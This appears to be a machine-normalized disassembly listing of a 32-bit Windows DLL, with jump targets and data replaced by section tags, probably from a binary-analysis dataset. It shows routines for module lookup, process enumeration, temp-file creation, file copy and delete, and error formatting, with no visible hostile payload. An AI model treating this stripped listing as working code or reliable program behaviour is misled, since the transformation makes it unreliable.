mov eax [ ebp - 0x50 ]
imul ecx ecx 0x1c
add ecx eax
push ecx
call sub_100139b7
push [ ebp - 0x50 ]
call sub_100272e8
pop ecx
push esi
push esi
call sub_1002ae74
mov eax edi
sub eax [ ebp + 0x10 ]
push 0x1c
cdq
pop ecx
idiv ecx
push [ ebp - 0x5c ]
cmp eax 0x1
jae r-xdata
mov eax [ ebp - 0x54 ]
lea ecx [ eax + 0x1 ]
imul eax eax 0x1c
add eax [ ebp - 0x50 ]
imul ecx ecx 0x1c
add ecx [ ebp - 0x50 ]
push ecx
call sub_100139b7
lea ecx [ ebp - 0x4c ]
call sub_100025cf
mov [ ebp - 0x4 ] 0x5
mov edi [ esi + 0x10 ]
lea ebx [ edi - 0x1c ]
push edi
mov edx edi
mov ecx ebx
call sub_100019ba
push [ ebp + 0x10 ]
mov [ esi + 0x10 ] eax
mov eax edi
mov ecx ebx
call sub_100019fa
pop ecx
lea eax [ ebp - 0x4c ]
push eax
mov eax [ ebp + 0x10 ]
lea ecx [ eax + 0x1c ]
push ecx
call sub_100019db
pop ecx
pop ecx
lea ecx [ ebp - 0x4c ]
lea ecx [ ebp - 0x30 ]
call sub_100025cf
push 0x2
pop edi
mov [ ebp - 0x4 ] edi
mov ecx [ ebp + 0x10 ]
push [ esi + 0x10 ]
lea edx [ ecx + 0x1c ]
call sub_100019ba
mov [ ebp - 0x4 ] 0x3
mov ecx [ esi + 0x10 ]
lea eax [ ebp - 0x30 ]
push eax
mov eax ecx
sub eax [ ebp + 0x10 ]
push 0x1c
pop ebx
cdq
idiv ebx
xor edx edx
inc edx
sub edx eax
push edx
push ecx
call sub_100015ef
mov [ ebp - 0x4 ] edi
add [ esi + 0x10 ] ebx
mov esi [ esi + 0x10 ]
lea eax [ ebp - 0x30 ]
push eax
mov eax [ ebp + 0x10 ]
add esi 0xffffffe4
push esi
call sub_100019db
pop ecx
pop ecx
lea ecx [ ebp - 0x30 ]
jmp r-xdata
push 0x0
push 0x1
call sub_1000264e
call sub_1002b3a1
retn 0xc
sub_100155d9
push 0x44
mov eax sub_100502d2
call sub_1002b2a6
push r--data
lea ecx [ ebp - 0x28 ]
call sub_10001ebc
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x28 ]
push eax
lea ecx [ ebp - 0x50 ]
call sub_10001ca0
push r--data
lea eax [ ebp - 0x50 ]
push eax
mov [ ebp - 0x50 ] r--data
call sub_1002ae74
int3
sub_10015631
push 0x4
mov eax sub_1004f9da
call sub_1002b2d9
mov esi ecx
and [ esi ] 0x0
and [ ebp - 0x4 ] 0x0
push 0x10
call sub_1002738b
pop ecx
test eax eax
je r-xdata
xor eax eax
xor ecx ecx
inc ecx
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] ecx
mov ecx [ ebp + 0x8 ]
mov [ eax ] r--data
mov [ eax + 0xc ] ecx
jmp r-xdata
mov [ esi ] eax
mov eax esi
call sub_1002b37e
retn 0x4
sub_100156ab
push 0x1c
mov eax sub_10050f5a
call sub_1002b2a6
push r--data
lea ecx [ ebp - 0x28 ]
mov [ esi ] r--data
call sub_10001362
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x28 ]
push eax
call sub_100156f5
push 0x0
push 0x1
lea ecx [ ebp - 0x28 ]
mov [ esi + 0x4 ] eax
call sub_1000264e
mov eax esi
call sub_1002b37e
retn
sub_100156f5
push 0x20
mov eax sub_10050c1d
call sub_1002b2a6
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x18 ] 0x8
jb r-xdata
add eax 0x4
mov eax [ eax + 0x4 ]
jmp r-xdata
push eax
call [ GetModuleHandleW@IAT ]
push r--data
lea ecx [ ebp - 0x28 ]
mov esi eax
call sub_10001ebc
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x28 ]
push eax
test esi esi
sete al
movzx eax al
push eax
call sub_1001486a
pop ecx
pop ecx
push 0x0
push 0x1
lea ecx [ ebp - 0x28 ]
call sub_100020e2
mov eax esi
call sub_1002b37e
retn 0x4
sub_10015756
push 0x44
mov eax sub_10050f37
call sub_1002b2a6
lea eax [ ebp - 0x10 ]
push eax
push sub_1000d3de
xor ebx ebx
push 0x6
mov [ ebp - 0x10 ] ebx
call [ GetModuleHandleExW@IAT ]
mov esi r--data
push esi
lea ecx [ ebp - 0x30 ]
mov [ ebp - 0x14 ] eax
call sub_10001ebc
xor edi edi
lea eax [ ebp - 0x30 ]
inc edi
cmp [ ebp - 0x14 ] edi
push eax
setne al
movzx eax al
push eax
mov [ ebp - 0x4 ] ebx
call sub_1001486a
or [ ebp - 0x4 ] 0xffffffff
pop ecx
pop ecx
push ebx
push edi
lea ecx [ ebp - 0x30 ]
call sub_100020e2
push esi
lea ecx [ ebp - 0x4c ]
call sub_10001ebc
mov [ ebp - 0x4 ] edi
cmp [ ebp - 0x10 ] ebx
lea eax [ ebp - 0x4c ]
push eax
sete al
movzx eax al
push eax
call sub_1001486a
pop ecx
pop ecx
push ebx
push edi
lea ecx [ ebp - 0x4c ]
call sub_100020e2
mov eax [ ebp - 0x10 ]
call sub_1002b37e
retn
sub_100157e6
push 0x1c
mov eax sub_10050c63
call sub_1002b2a6
mov eax [ ebp + 0xc ]
cmp [ eax + 0x18 ] 0x10
jb r-xdata
add eax 0x4
mov eax [ eax + 0x4 ]
jmp r-xdata
mov eax esi
call sub_1002b37e
retn 0x8
call [ GetLastError@IAT ]
cmp eax 0x2
je r-xdata
push eax
mov eax [ ebp + 0x8 ]
push [ eax + 0x4 ]
call [ GetProcAddress@IAT ]
mov esi eax
test esi esi
jne r-xdata
push r--data
lea ecx [ ebp - 0x28 ]
call sub_10001ebc
and [ ebp - 0x4 ] esi
lea eax [ ebp - 0x28 ]
push eax
push 0x1
call sub_1001486a
pop ecx
pop ecx
push esi
push 0x1
lea ecx [ ebp - 0x28 ]
call sub_100020e2
sub_10015853
push 0x1c
mov eax sub_10050c63
call sub_1002b2a6
mov eax [ ebp + 0xc ]
cmp [ eax + 0x18 ] 0x10
jb r-xdata
add eax 0x4
mov eax [ eax + 0x4 ]
jmp r-xdata
push eax
mov eax [ ebp + 0x8 ]
push [ eax + 0x4 ]
call [ GetProcAddress@IAT ]
push r--data
lea ecx [ ebp - 0x28 ]
mov esi eax
call sub_10001ebc
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x28 ]
push eax
test esi esi
sete al
movzx eax al
push eax
call sub_1001486a
pop ecx
pop ecx
push 0x0
push 0x1
lea ecx [ ebp - 0x28 ]
call sub_100020e2
mov eax esi
call sub_1002b37e
retn 0x8
sub_100158ba
push 0x230
mov eax sub_10050eff
call sub_1002b30f
mov eax [ ebp + 0x8 ]
and [ ebp - 0x220 ] 0x0
mov esi 0x208
push esi
mov [ ebp - 0x21c ] eax
lea eax [ ebp - 0x218 ]
push 0x0
push eax
call sub_10027650
add esp 0xc
push esi
lea eax [ ebp - 0x218 ]
push eax
push [ ebp - 0x21c ]
call [ GetModuleFileNameW@IAT ]
push r--data
lea ecx [ ebp - 0x23c ]
mov esi eax
call sub_10001ebc
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x23c ]
push eax
test esi esi
sete al
movzx eax al
push eax
call sub_1001486a
or [ ebp - 0x4 ] 0xffffffff
pop ecx
pop ecx
push 0x0
push 0x1
lea ecx [ ebp - 0x23c ]
call sub_100020e2
push esi
lea eax [ ebp - 0x218 ]
push eax
mov ecx ebx
call sub_10004a31
mov eax ebx
call sub_1002b392
retn
sub_1001595b
push ecx
push ecx
and [ esp + 0x4 ] 0x0
push ebx
push [ eax + 0x4 ]
mov ebx ecx
call sub_100158ba
pop ecx
mov eax ebx
pop ebx
pop ecx
pop ecx
retn
sub_1001597f
push 0x3c
mov eax sub_10050ed9
call sub_1002b2a6
xor edi edi
push edi
push 0x2
call CreateToolhelp32Snapshot
mov esi r--data
push esi
lea ecx [ ebp - 0x28 ]
mov ebx eax
call sub_10001ebc
lea eax [ ebp - 0x28 ]
push eax
cmp ebx edi
sete al
movzx eax al
push eax
mov [ ebp - 0x4 ] edi
call sub_1001486a
or [ ebp - 0x4 ] 0xffffffff
pop ecx
pop ecx
push edi
inc edi
push edi
lea ecx [ ebp - 0x28 ]
call sub_100020e2
push esi
lea ecx [ ebp - 0x44 ]
call sub_10001ebc
lea eax [ ebp - 0x44 ]
push eax
cmp ebx 0xffffffff
sete al
movzx eax al
push eax
mov [ ebp - 0x4 ] edi
call sub_1001486a
pop ecx
pop ecx
push 0x0
push edi
lea ecx [ ebp - 0x44 ]
call sub_100020e2
mov eax ebx
call sub_1002b37e
retn
sub_100159ff
push 0x60
mov eax sub_10050eae
call sub_1002b2a6
test edi edi
jne r-xdata
mov esi 0x22c
push esi
push 0x0
push edi
call sub_10027650
mov eax [ ebp + 0x8 ]
add esp 0xc
mov [ edi ] esi
mov eax [ eax + 0x4 ]
push edi
push eax
call Process32FirstW
xor ebx ebx
mov esi eax
inc ebx
cmp esi ebx
je r-xdata
push r--data
lea ecx [ ebp - 0x44 ]
call sub_10001ebc
and [ ebp - 0x4 ] edi
lea eax [ ebp - 0x44 ]
push eax
lea ecx [ ebp - 0x6c ]
call sub_10001eec
push r--data
lea eax [ ebp - 0x6c ]
push eax
call sub_1002ae74
push r--data
lea ecx [ ebp - 0x28 ]
call sub_10001ebc
lea eax [ ebp - 0x28 ]
push eax
cmp esi ebx
setne al
movzx eax al
push eax
mov [ ebp - 0x4 ] ebx
call sub_1001486a
pop ecx
pop ecx
push 0x0
push ebx
lea ecx [ ebp - 0x28 ]
call sub_100020e2
mov al bl
call [ GetLastError@IAT ]
cmp eax 0x12
jne r-xdata
xor al al
jmp r-xdata
call sub_1002b37e
retn 0x4
sub_10015aaa
push 0x60
mov eax sub_10050eae
call sub_1002b2a6
test edi edi
jne r-xdata
mov esi 0x22c
push esi
push 0x0
push edi
call sub_10027650
mov eax [ ebp + 0x8 ]
add esp 0xc
mov [ edi ] esi
mov eax [ eax + 0x4 ]
push edi
push eax
call Process32NextW
xor ebx ebx
mov esi eax
inc ebx
cmp esi ebx
je r-xdata
push r--data
lea ecx [ ebp - 0x44 ]
call sub_10001ebc
and [ ebp - 0x4 ] edi
lea eax [ ebp - 0x44 ]
push eax
lea ecx [ ebp - 0x6c ]
call sub_10001eec
push r--data
lea eax [ ebp - 0x6c ]
push eax
call sub_1002ae74
push r--data
lea ecx [ ebp - 0x28 ]
call sub_10001ebc
lea eax [ ebp - 0x28 ]
push eax
cmp esi ebx
setne al
movzx eax al
push eax
mov [ ebp - 0x4 ] ebx
call sub_1001486a
pop ecx
pop ecx
push 0x0
push ebx
lea ecx [ ebp - 0x28 ]
call sub_100020e2
mov al bl
call [ GetLastError@IAT ]
cmp eax 0x12
jne r-xdata
xor al al
jmp r-xdata
call sub_1002b37e
retn 0x4
sub_10015b55
push 0x1c
mov eax sub_10050c63
call sub_1002b2a6
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x18 ] 0x8
jb r-xdata
add eax 0x4
mov eax [ eax + 0x4 ]
jmp r-xdata
add ecx 0x4
mov ecx [ ecx + 0x4 ]
jmp r-xdata
cmp [ ecx + 0x18 ] 0x8
jb r-xdata
push 0x0
push eax
push ecx
call [ CopyFileW@IAT ]
push r--data
lea ecx [ ebp - 0x28 ]
mov edi eax
call sub_10001ebc
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x28 ]
push eax
cmp edi 0x1
setne al
movzx eax al
push eax
call sub_1001486a
pop ecx
pop ecx
push 0x0
push 0x1
lea ecx [ ebp - 0x28 ]
call sub_100020e2
call sub_1002b37e
retn
sub_10015bc4
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_10050e70
mov eax [ fs : 0x0 ]
push eax
sub esp 0x94
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x8c ] eax
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0xa0 ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov [ esp + 0x18 ] eax
xor ecx ecx
cmp [ ebx + 0x18 ] 0x8
lea eax [ ebx + 0x4 ]
mov [ esp + 0x10 ] ecx
mov [ esp + 0x14 ] eax
jb r-xdata
mov esi [ GetEnvironmentVariableW@IAT ]
push ecx
push ecx
push eax
call esi
mov edi r--data
push edi
lea ecx [ esp + 0x20 ]
mov [ esp + 0x14 ] eax
call sub_10001ebc
and [ esp + 0xa8 ] 0x0
cmp [ esp + 0x10 ] 0x0
lea eax [ esp + 0x1c ]
push eax
sete al
movzx eax al
push eax
call sub_1001486a
or [ esp + 0xb0 ] 0xffffffff
pop ecx
pop ecx
push 0x0
push 0x1
lea ecx [ esp + 0x24 ]
call sub_100020e2
push 0x0
push [ esp + 0x14 ]
lea ecx [ esp + 0x84 ]
call sub_10004a57
mov [ esp + 0xa8 ] 0x1
cmp [ esp + 0x94 ] 0x8
mov ecx [ esp + 0x80 ]
jae r-xdata
mov eax [ eax ]
cmp [ ebx + 0x18 ] 0x8
mov eax [ esp + 0x14 ]
jb r-xdata
lea ecx [ esp + 0x80 ]
push [ esp + 0x90 ]
push ecx
push eax
call esi
push edi
lea ecx [ esp + 0x20 ]
mov esi eax
call sub_10001ebc
lea eax [ esp + 0x1c ]
push eax
test esi esi
sete al
movzx eax al
push eax
mov [ esp + 0xb0 ] 0x2
call sub_1001486a
pop ecx
pop ecx
push 0x0
push 0x1
lea ecx [ esp + 0x24 ]
mov [ esp + 0xb0 ] 0x1
call sub_100020e2
inc esi
cmp [ esp + 0x10 ] esi
je r-xdata
mov eax [ eax ]
cmp [ esp + 0x94 ] 0x8
mov eax [ esp + 0x80 ]
jae r-xdata
push r--data
lea ecx [ esp + 0x3c ]
call sub_10001ebc
lea eax [ esp + 0x38 ]
push eax
lea ecx [ esp + 0x58 ]
mov [ esp + 0xac ] 0x3
call sub_10001eec
push r--data
lea eax [ esp + 0x58 ]
push eax
call sub_1002ae74
mov ecx [ esp + 0x18 ]
push eax
call sub_10001362
push 0x0
push 0x1
lea ecx [ esp + 0x84 ]
call sub_1000264e
mov eax [ esp + 0x18 ]
mov ecx [ esp + 0xa0 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov ecx [ esp + 0x8c ]
xor ecx esp
call sub_10027150
mov esp ebp
pop ebp
retn
lea eax [ esp + 0x80 ]
sub_10015d8f
push 0x27c
mov eax sub_10050e22
call sub_1002b30f
xor edi edi
push 0x20a
lea eax [ ebp - 0x224 ]
push edi
push eax
mov esi ecx
mov [ ebp - 0x228 ] edi
call sub_10027650
add esp 0xc
cmp [ esi + 0x18 ] 0x8
jb r-xdata
add esi 0x4
mov esi [ esi + 0x4 ]
jmp r-xdata
lea eax [ ebp - 0x224 ]
push eax
mov ecx ebx
call sub_10001362
mov eax ebx
call sub_1002b392
retn
push r--data
lea ecx [ ebp - 0x260 ]
call sub_10001ebc
lea eax [ ebp - 0x260 ]
push eax
lea ecx [ ebp - 0x288 ]
mov [ ebp - 0x4 ] edi
call sub_10001eec
push r--data
lea eax [ ebp - 0x288 ]
push eax
call sub_1002ae74
lea eax [ ebp - 0x224 ]
push eax
push edi
push edi
push esi
call [ GetTempFileNameW@IAT ]
push r--data
lea ecx [ ebp - 0x244 ]
mov esi eax
call sub_10001ebc
lea eax [ ebp - 0x244 ]
push eax
cmp esi edi
sete al
movzx eax al
push eax
mov [ ebp - 0x4 ] edi
call sub_1001486a
or [ ebp - 0x4 ] 0xffffffff
pop ecx
pop ecx
push edi
xor edi edi
inc edi
push edi
lea ecx [ ebp - 0x244 ]
call sub_100020e2
cmp esi 0x6f
jne r-xdata
sub_10015e6c
push 0x20
mov eax sub_10050c1d
call sub_1002b2a6
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x18 ] 0x8
jb r-xdata
add eax 0x4
mov eax [ eax + 0x4 ]
jmp r-xdata
push eax
call [ DeleteFileW@IAT ]
push r--data
lea ecx [ ebp - 0x28 ]
mov esi eax
call sub_10001ebc
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x28 ]
push eax
cmp esi 0x1
setne al
movzx eax al
push eax
call sub_1001486a
pop ecx
pop ecx
push 0x0
push 0x1
lea ecx [ ebp - 0x28 ]
call sub_100020e2
call sub_1002b37e
retn
sub_10015eca
push 0x20
mov eax sub_10050c1d
call sub_1002b2a6
push ebx
push [ ebp + 0x8 ]
lea edi [ ebp - 0x28 ]
call sub_10015f14
pop ecx
pop ecx
and [ ebp - 0x4 ] 0x0
push eax
mov ecx esi
call sub_10001eec
push 0x0
push 0x1
mov ecx edi
mov [ esi ] r--data
call sub_100020e2
mov [ esi ] r--data
mov [ esi + 0x28 ] ebx
mov eax esi
call sub_1002b37e
retn 0x4
sub_10015f14
push 0xd4
mov eax sub_100506f8
call sub_1002b30f
mov eax [ ebp + 0x8 ]
mov [ ebp - 0x4c ] eax
lea eax [ ebp + 0xc ]
xor esi esi
push eax
lea ecx [ ebp - 0x48 ]
mov [ ebp - 0x50 ] esi
call sub_100160cd
pop ecx
mov [ ebp - 0x4 ] esi
push [ ebp + 0xc ]
lea ecx [ ebp - 0x2c ]
call sub_10016033
pop ecx
push [ ebp - 0x4c ]
xor ebx ebx
lea eax [ ebp - 0xdc ]
push r--data
inc ebx
push eax
mov [ ebp - 0x4 ] bl
call sub_10016103
add esp 0xc
push r--data
push eax
lea eax [ ebp - 0xa4 ]
push eax
mov [ ebp - 0x4 ] 0x2
call sub_10013a76
add esp 0xc
lea ecx [ ebp - 0x48 ]
push ecx
push eax
lea eax [ ebp - 0x88 ]
push eax
mov [ ebp - 0x4 ] 0x3
call sub_10013abd
add esp 0xc
push r--data
push eax
lea eax [ ebp - 0xc0 ]
push eax
mov [ ebp - 0x4 ] 0x4
call sub_10013a76
add esp 0xc
lea ecx [ ebp - 0x2c ]
push ecx
push eax
lea eax [ ebp - 0x6c ]
push eax
mov [ ebp - 0x4 ] 0x5
call sub_10013abd
add esp 0xc
push r--data
push eax
push edi
mov [ ebp - 0x4 ] 0x6
call sub_10013a76
add esp 0xc
push esi
push ebx
lea ecx [ ebp - 0x6c ]
call sub_100020e2
push esi
push ebx
lea ecx [ ebp - 0xc0 ]
call sub_100020e2
push esi
push ebx
lea ecx [ ebp - 0x88 ]
call sub_100020e2
push esi
push ebx
lea ecx [ ebp - 0xa4 ]
call sub_100020e2
push esi
push ebx
lea ecx [ ebp - 0xdc ]
call sub_100020e2
push esi
push ebx
lea ecx [ ebp - 0x2c ]
call sub_100020e2
push esi
push ebx
lea ecx [ ebp - 0x48 ]
call sub_100020e2
mov eax edi
call sub_1002b392
retn
sub_10016033
push 0x28
mov eax sub_100502af
call sub_1002b2a6
xor esi esi
push esi
push esi
lea eax [ ebp - 0x10 ]
push eax
push 0x400
push [ ebp + 0x8 ]
mov [ ebp - 0x4 ] esi
push esi
mov edi ecx
mov [ ebp - 0x18 ] esi
push 0x1300
mov [ ebp - 0x14 ] edi
mov [ ebp - 0x10 ] esi
call [ FormatMessageA@IAT ]
mov ebx eax
cmp ebx 0x4
jbe r-xdata
push r--data
mov ecx edi
call sub_10001ebc
xor edi edi
mov [ ebp - 0x4 ] esi
inc edi
mov [ ebp - 0x18 ] edi
cmp [ ebp - 0x10 ] esi
je r-xdata
sub ebx 0x3
mov eax [ ebp - 0x14 ]
call sub_1002b37e
retn
cmp ebx esi
jbe r-xdata
cmp [ ebp - 0x10 ] esi
je r-xdata
push ebx
push [ ebp - 0x10 ]
lea ecx [ ebp - 0x34 ]
call sub_1000dd07
push 0xffffffff
push esi
mov [ ebp - 0x4 ] edi
mov ecx [ ebp - 0x14 ]
push eax
call sub_100021c3
push esi
push edi
lea ecx [ ebp - 0x34 ]
call sub_100020e2
push [ ebp - 0x10 ]
call [ LocalFree@IAT ]
sub_100160cd
push ebp
mov ebp esp
sub esp 0x20
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
and [ ebp - 0x1c ] 0x0
push edi
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax ]
mov edi ecx
call sub_1001614e
pop ecx
pop ecx
mov ecx [ ebp - 0x4 ]
mov eax edi
xor ecx ebp
pop edi
call sub_10027150
leave
retn
sub_10016103
push 0x20
mov eax sub_10050bfa
call sub_1002b2a6
push [ ebp + 0xc ]
and [ ebp - 0x10 ] 0x0
lea ecx [ ebp - 0x2c ]
call sub_10001ebc
and [ ebp - 0x4 ] 0x0
push 0xffffffff
push 0x0
push [ ebp + 0x10 ]
mov ecx eax
call sub_100071fd
mov ecx [ ebp + 0x8 ]
push eax
call sub_10002255
push 0x0
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_100020e2
mov eax [ ebp + 0x8 ]
call sub_1002b37e
retn
sub_1001614e
push 0xc
mov eax sub_10050699
call sub_1002b2a6
mov eax [ ebp + 0xc ]
and [ ebp - 0x10 ] 0x0
mov ecx edi
mov [ ebp - 0x14 ] edi
lea esi [ eax + 0x13 ]
call sub_100082a7
and [ ebp - 0x4 ] 0x0
push [ ebp + 0x8 ]
mov ecx esi
mov [ ebp - 0x10 ] 0x1
call sub_10016197
pop ecx
push [ ebp - 0x14 ]
push esi
push eax
push edi
call sub_10016269
mov eax edi
call sub_1002b37e
retn
sub_10016197
push 0x30
mov eax sub_1005065b
call sub_1002b30f
mov esi ecx
lea ecx [ ebp - 0x34 ]
call sub_1000736c
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x34 ]
push eax
call sub_10016973
mov edi eax
pop ecx
lea eax [ ebp - 0x2c ]
push eax
mov ecx edi
call sub_10005f61
mov [ ebp - 0x4 ] 0x1
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x3c ] eax
test eax eax
je r-xdata
mov [ ebp - 0x2d ] 0x0
mov eax [ edi ]
mov ecx edi
call [ eax + 0x8 ]
mov [ ebp - 0x2d ] al
jmp r-xdata
xor edi edi
lea eax [ ebp - 0x2c ]
call sub_1000f120
mov bl [ eax ]
mov bl 0x7f
jmp r-xdata
and [ ebp - 0x38 ] 0x0
xor edi edi
lea eax [ ebp - 0x2c ]
call sub_1000f120
cmp [ eax ] 0x0
jg r-xdata
mov eax [ ebp + 0x8 ]
xor edx edx
push 0xa
pop edi
div edi
dec cl
dec esi
add dl 0x30
mov [ esi ] dl
mov [ ebp + 0x8 ] eax
test eax eax
jne r-xdata
mov edi [ ebp - 0x38 ]
inc edi
mov [ ebp - 0x38 ] edi
cmp edi [ ebp - 0x3c ]
jae r-xdata
mov cl bl
test cl cl
jne r-xdata
push eax
push 0x1
lea ecx [ ebp - 0x2c ]
call sub_100020e2
lea ecx [ ebp - 0x34 ]
call sub_10007dbd
mov eax esi
call sub_1002b392
retn
mov al [ ebp - 0x2d ]
dec esi
mov cl bl
mov [ esi ] al
lea eax [ ebp - 0x2c ]
call sub_1000f120
mov al [ eax ]
mov bl 0x7f
test al al
jle r-xdata
mov bl al
sub_10016269
push ebp
mov ebp esp
and esp 0xfffffff8
mov ecx [ ebp + 0x8 ]
sub esp 0x10
push esi
push edi
lea eax [ esp + 0x8 ]
push eax
call sub_10008282
mov esi [ eax ]
mov edi [ eax + 0x4 ]
mov ecx [ ebp + 0x8 ]
lea eax [ esp + 0x10 ]
push eax
call sub_10008213
push [ ebp + 0x10 ]
mov ecx [ ebp + 0x8 ]
push [ ebp + 0xc ]
push edi
push esi
push [ eax + 0x4 ]
push [ eax ]
call sub_100162b0
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x10
sub_100162b0
push ebp
mov ebp esp
and esp 0xfffffff8
push ecx
push ecx
push [ esp + 0x4 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_100162d9
mov esp ebp
pop ebp
retn 0x18
sub_100162d9
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_1004fd38
mov eax [ fs : 0x0 ]
push eax
sub esp 0x28
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x20 ] eax
push esi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x30 ]
mov [ fs : 0x0 ] eax
push [ ebp + 0x1c ]
mov eax [ ebp + 0x18 ]
mov esi ecx
push eax
lea ecx [ esp + 0x14 ]
call sub_100163c0
and [ esp + 0x38 ] 0x0
lea eax [ esp + 0xc ]
push eax
push [ ebp + 0x14 ]
mov ecx esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1001636a
push 0x0
push 0x1
lea ecx [ esp + 0x14 ]
call sub_100020e2
mov eax esi
mov ecx [ esp + 0x30 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov ecx [ esp + 0x20 ]
xor ecx esp
call sub_10027150
mov esp ebp
pop ebp
retn 0x1c
sub_1001636a
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
push edi
lea eax [ ebp - 0x10 ]
push eax
mov ebx ecx
call sub_10008213
push [ ebp + 0xc ]
mov esi [ eax ]
push [ ebp + 0x8 ]
mov edi [ eax + 0x4 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
call sub_10016725
push edi
push esi
push [ ebp + 0xc ]
mov [ ebp - 0x8 ] eax
push [ ebp + 0x8 ]
call sub_10016725
add esp 0x20
push 0xffffffff
push 0x0
push [ ebp + 0x18 ]
mov ecx ebx
push [ ebp - 0x8 ]
push eax
call sub_1001643e
pop edi
pop esi
pop ebx
leave
retn 0x14
sub_100163c0
push ebp
mov ebp esp
push esi
mov esi ecx
push 0x0
mov [ esi + 0x18 ] 0xf
call sub_100021a7
push [ ebp + 0xc ]
mov ecx esi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_100163eb
mov eax esi
pop esi
pop ebp
retn 0x8
sub_100163eb
push 0x8
mov eax sub_1004fd15
call sub_1002b2d9
mov [ ebp - 0x14 ] ecx
mov eax [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
sub eax esi
push eax
call sub_10006c60
and [ ebp - 0x4 ] 0x0
call sub_1002b37e
retn 0xc
movzx eax [ esi ]
mov ecx [ ebp - 0x14 ]
push eax
push 0x1
call sub_100014aa
inc esi
jmp r-xdata
cmp esi [ ebp + 0xc ]
je r-xdata
sub_1001643e
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi ecx
cmp [ edi + 0x14 ] esi
jb r-xdata
call sub_10021cfc
mov eax [ ebp + 0x10 ]
mov eax [ eax + 0x14 ]
cmp eax [ ebp + 0x14 ]
jae r-xdata
mov ecx [ edi + 0x14 ]
mov eax ecx
sub eax esi
cmp eax [ ebp + 0xc ]
jae r-xdata
mov eax [ ebp + 0x10 ]
mov eax [ eax + 0x14 ]
sub eax [ ebp + 0x14 ]
cmp eax [ ebp + 0x18 ]
jae r-xdata
mov [ ebp + 0xc ] eax
sub ecx [ ebp + 0xc ]
or eax 0xffffffff
sub eax [ ebp + 0x18 ]
cmp eax ecx
ja r-xdata
mov [ ebp + 0x18 ] eax
mov eax [ edi + 0x14 ]
mov ecx eax
sub ecx [ ebp + 0xc ]
mov ebx eax
add ecx [ ebp + 0x18 ]
sub ebx esi
sub ebx [ ebp + 0xc ]
mov [ ebp - 0x4 ] ecx
mov [ ebp + 0x8 ] ebx
cmp eax ecx
jae r-xdata
call sub_10021cc4
cmp edi [ ebp + 0x10 ]
je r-xdata
push 0x0
push ecx
mov ecx edi
call sub_1000212d
mov eax [ ebp + 0xc ]
lea ebx [ edi + 0x4 ]
cmp [ ebp + 0x18 ] eax
ja r-xdata
mov eax [ edi + 0x18 ]
cmp eax 0x10
jb r-xdata
cmp [ ebp + 0x14 ] esi
ja r-xdata
mov eax [ edi + 0x18 ]
cmp eax 0x10
jb r-xdata
lea edx [ edi + 0x4 ]
mov edx [ edi + 0x4 ]
jmp r-xdata
add eax esi
cmp eax [ ebp + 0x14 ]
mov eax [ edi + 0x18 ]
ja r-xdata
mov eax [ edi + 0x18 ]
cmp eax 0x10
jb r-xdata
mov ecx ebx
mov ecx [ ebx ]
jmp r-xdata
lea ecx [ edi + 0x4 ]
mov ecx [ edi + 0x4 ]
jmp r-xdata
cmp eax 0x10
jb r-xdata
cmp eax 0x10
jb r-xdata
cmp eax 0x10
jb r-xdata
mov ecx ebx
mov ecx [ ebx ]
jmp r-xdata
mov [ ebp + 0x10 ] ebx
mov edx [ ebx ]
mov [ ebp + 0x10 ] edx
jmp r-xdata
cmp eax 0x10
jb r-xdata
lea edx [ eax + 0x4 ]
mov edx [ eax + 0x4 ]
jmp r-xdata
add edx esi
add edx [ ebp + 0xc ]
push ebx
sub eax esi
sub eax [ ebp + 0x18 ]
push edx
add ecx esi
add ecx [ ebp + 0x18 ]
push eax
push ecx
call sub_10001f2b
mov eax [ ebp + 0x10 ]
add esp 0x10
cmp [ eax + 0x18 ] 0x10
jb r-xdata
mov ecx ebx
mov ecx [ ebx ]
jmp r-xdata
mov ecx ebx
mov ecx [ ebx ]
jmp r-xdata
mov [ ebp + 0x10 ] ebx
mov edx [ ebx ]
mov [ ebp + 0x10 ] edx
jmp r-xdata
cmp eax 0x10
jb r-xdata
mov ecx ebx
mov ecx [ ebx ]
jmp r-xdata
push [ ebp + 0x18 ]
mov edx [ ebp + 0x14 ]
add ecx edx
sub eax esi
push ecx
push eax
mov eax [ ebp + 0x10 ]
add eax esi
push eax
call sub_10001f2b
mov eax [ edi + 0x18 ]
add esp 0x10
cmp eax 0x10
jb r-xdata
lea ecx [ edi + 0x4 ]
mov ecx [ edi + 0x4 ]
jmp r-xdata
mov eax [ edi + 0x18 ]
cmp eax 0x10
jb r-xdata
